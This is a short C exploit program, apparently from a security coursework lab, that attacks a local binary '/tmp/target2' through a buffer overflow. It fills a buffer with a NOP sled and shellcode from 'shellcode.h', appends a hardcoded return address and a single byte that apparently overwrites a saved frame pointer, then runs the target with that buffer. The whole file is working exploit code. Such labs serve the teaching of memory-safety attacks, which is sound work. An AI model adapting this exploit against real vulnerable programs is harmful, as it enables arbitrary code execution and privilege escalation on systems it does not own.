#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include "shellcode.h"

#define TARGET    "/tmp/target2"
#define NOP       0x90
#define BUFF_SIZE 1024

int main(void)
{
  char *args[3];
  char *env[1];

  int i, j;
  char buff[BUFF_SIZE];

  bzero(&buff, BUFF_SIZE);
  for (i = 0 ; i <= (196 - sizeof(shellcode)) ; i++)
    buff[i] = NOP;
  for (j = 0, i = i ; j < (sizeof(shellcode) - 1) ; i++, j++)
    buff[i] = shellcode[j];

  buff[i++] = 0xd0;
  buff[i++] = 0xfc;
  buff[i++] = 0xff;
  buff[i++] = 0xbf;

  buff[i++] = 0xac;

  args[0] = TARGET; args[1] = buff; args[2] = NULL;
  env[0] = NULL;

  if (0 > execve(TARGET, args, env))
    fprintf(stderr, "execve failed.\n");

  return 0;
}
